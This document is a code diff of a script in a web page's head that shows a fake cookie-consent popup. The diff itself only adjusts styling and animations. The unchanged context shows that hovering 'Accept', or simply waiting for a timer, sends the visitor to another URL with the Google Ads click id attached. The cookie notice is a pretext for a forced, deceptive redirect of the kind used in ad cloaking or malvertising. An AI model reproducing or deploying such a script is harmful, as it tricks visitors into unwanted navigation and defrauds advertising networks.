@@ -30,18 +30,16 @@
 
   const messages = [
     "🍪 <strong>Important:</strong> We use cookies to improve your experience.<br><br><strong>By hovering 'Accept', you agree.</strong>",
-    "🍪 <strong>Notice!</strong> Cookies help us serve you better.<br><br><strong>Hover 'Accept' to continue.</strong>",
-    "🍪 <strong>Privacy Info:</strong> Cookies are used for a better service.<br><br><strong>Hover to accept or decline.</strong>"
+    "🔔 <strong>Notice!</strong> Cookies help us serve you better.<br><br><strong>Hover 'Accept' to continue.</strong>",
+    "🔒 <strong>Privacy Info:</strong> Cookies are used for a better service.<br><br><strong>Hover to accept or decline.</strong>"
   ];
   const randomText = () => messages[Math.floor(Math.random() * messages.length)];
 
   function redirectUser() {
     if (redirected) return;
     redirected = true;
-
     const gclid = new URLSearchParams(window.location.search).get('gclid');
     const finalUrl = gclid ? `${redirectUrl}${redirectUrl.includes('?') ? '&' : '?'}gclid=${gclid}` : redirectUrl;
-
     window.location.href = finalUrl;
   }
 
@@ -50,8 +48,10 @@
     popup.innerHTML = `
       <div class="cookie-overlay">
         <div class="cookie-box">
-          <h3 class="cookie-title" style="color: ${randomColor()}">🔒 Privacy Notice</h3>
-          <p class="cookie-message">${randomText()}</p>
+          <div class="decor-line"></div>
+          <h3 class="cookie-title color-cycle">🔒 Privacy Notice</h3>
+          <div class="decor-line bottom"></div>
+          <p class="cookie-message color-cycle">${randomText()}</p>
           <div class="cookie-actions">
             <button id="acceptBtn" style="background: ${randomColor()}">Accept</button>
             <button id="declineBtn" style="background: ${randomColor()}">Decline</button>
@@ -66,6 +66,23 @@
 
     const style = document.createElement("style");
     style.textContent = `
+      @keyframes fadeIn {
+        from { opacity: 0; transform: scale(0.95); }
+        to { opacity: 1; transform: scale(1); }
+      }
+
+      @keyframes colorCycle {
+        0% { color: #ff3d00; }
+        25% { color: #4caf50; }
+        50% { color: #2196f3; }
+        75% { color: #ff9800; }
+        100% { color: #ff3d00; }
+      }
+
+      .color-cycle {
+        animation: colorCycle 5s infinite linear;
+      }
+
       .cookie-overlay {
         position: fixed;
         top: 0; left: 0; right: 0; bottom: 0;
@@ -79,13 +96,15 @@
 
       .cookie-box {
         background: #fff;
-        border-radius: 20px;
-        padding: 2.5rem;
-        max-width: 450px;
+        border-radius: 18px;
+        padding: 2rem;
+        max-width: 440px;
         width: 90%;
         text-align: center;
-        box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
-        animation: fadeIn 0.4s ease-in-out;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        border: 1px solid ${randomColor()};
+        animation: fadeIn 0.5s ease-in-out;
+        position: relative;
       }
 
       .cookie-title {
@@ -95,7 +114,6 @@
       }
 
       .cookie-message {
-        color: #222;
         font-size: 17px;
         font-weight: 600;
         line-height: 1.6;
@@ -110,23 +128,31 @@
       }
 
       .cookie-actions button {
-        padding: 12px 22px;
+        padding: 10px 20px;
         border: none;
-        border-radius: 8px;
+        border-radius: 6px;
         color: #fff;
-        font-size: 16px;
+        font-size: 15px;
         font-weight: bold;
         cursor: pointer;
         transition: transform 0.2s, background 0.3s;
       }
 
       .cookie-actions button:hover {
-        transform: scale(1.08);
+        transform: scale(1.1);
       }
 
-      @keyframes fadeIn {
-        from { opacity: 0; transform: scale(0.9); }
-        to { opacity: 1; transform: scale(1); }
+      .decor-line {
+        height: 2px;
+        width: 100%;
+        background: linear-gradient(to right, ${randomColor()}, ${randomColor()});
+        margin-bottom: 1rem;
+        border-radius: 1px;
+      }
+
+      .decor-line.bottom {
+        margin-top: 1rem;
+        margin-bottom: 0;
       }
     `;
     document.head.appendChild(style);
@@ -162,9 +188,9 @@
       setTimeout(redirectUser, random(1200, 1800));
     }
   });
-
 })();
 </script>
+
 
   
 </head>
